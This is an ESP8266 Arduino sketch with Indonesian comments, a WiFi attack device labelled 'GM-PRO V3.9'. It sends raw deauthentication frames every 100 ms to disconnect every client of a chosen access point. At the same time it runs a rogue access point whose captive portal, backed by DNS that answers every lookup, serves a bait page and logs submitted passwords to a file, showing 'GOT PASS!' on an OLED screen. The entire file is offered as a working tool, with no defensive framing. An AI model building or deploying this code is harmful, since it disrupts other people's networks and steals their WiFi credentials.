#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <FS.h>
#include <Wire.h>
#include "SSD1306Wire.h"

// Bagian ini sangat penting agar tidak error 'wifi_send_pkt_freedom'
extern "C" {
  #include "user_interface.h"
  // Deklarasi manual fungsi SDK agar compiler tidak bingung
  void wifi_send_pkt_freedom(uint8 *buf, uint16 len, uint16 sys_seq);
}

// Konfigurasi Layar OLED
SSD1306Wire display(0x3c, D2, D1, GEOMETRY_64_48); 

struct Network {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
};

Network _networks[15];
Network _selectedNet;
String activeUmpan = "/index.html";
String lastPass = "";
bool isDeauthing = false;
unsigned long lastDeauthTime = 0;

DNSServer dnsServer;
ESP8266WebServer server(80);

void sendDeauth(uint8_t* target, uint8_t* ap, uint8_t ch) {
  wifi_set_channel(ch);
  uint8_t packet[26] = { 
    0xC0, 0x00, 0x3A, 0x01, 
    target[0], target[1], target[2], target[3], target[4], target[5], 
    ap[0], ap[1], ap[2], ap[3], ap[4], ap[5],                         
    ap[0], ap[1], ap[2], ap[3], ap[4], ap[5],                         
    0x00, 0x00, 0x01, 0x00 
  };
  wifi_send_pkt_freedom(packet, 26, 0);
}

void drawOLED() {
  display.clear();
  display.drawString(0, 0, "GM-PRO V3.9");
  display.drawLine(0, 11, 64, 11);
  if (lastPass != "") {
    display.drawString(0, 15, "GOT PASS!");
    display.drawString(0, 28, lastPass.substring(0, 8));
  } else if (isDeauthing) {
    display.drawString(0, 15, "ATTACKING");
    display.drawString(0, 28, "CH:" + String(_selectedNet.ch));
  } else {
    display.drawString(0, 15, "> STANDBY");
    display.drawString(0, 28, "VIVO1904");
  }
  display.display();
}

void setup() {
  SPIFFS.begin();
  display.init();
  display.flipScreenVertically();
  
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1); 
  
  WiFi.softAP("vivo1904", "sangkur87"); 
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  server.on("/", HTTP_GET, []() {
    File f = SPIFFS.open("/index.html", "r");
    if(f) { server.streamFile(f, "text/html"); f.close(); }
    else { server.send(200, "text/plain", "Data Error!"); }
  });

  server.on("/deauth", []() {
    isDeauthing = !isDeauthing;
    server.send(200, "text/html", "<script>location.href='/';</script>");
  });

  server.on("/login", []() {
    String p = server.arg("p");
    if (p != "") {
      lastPass = p;
      File f = SPIFFS.open("/pass.txt", "a");
      f.println("P: " + p);
      f.close();
    }
    server.send(200, "text/html", "Verifying...");
  });

  server.onNotFound([]() {
    File f = SPIFFS.open(activeUmpan, "r");
    if (f) { server.streamFile(f, "text/html"); f.close(); }
  });

  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  drawOLED();
  
  if (isDeauthing && (millis() - lastDeauthTime > 100)) {
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    sendDeauth(broadcast, _selectedNet.bssid, _selectedNet.ch);
    lastDeauthTime = millis();
  }
}
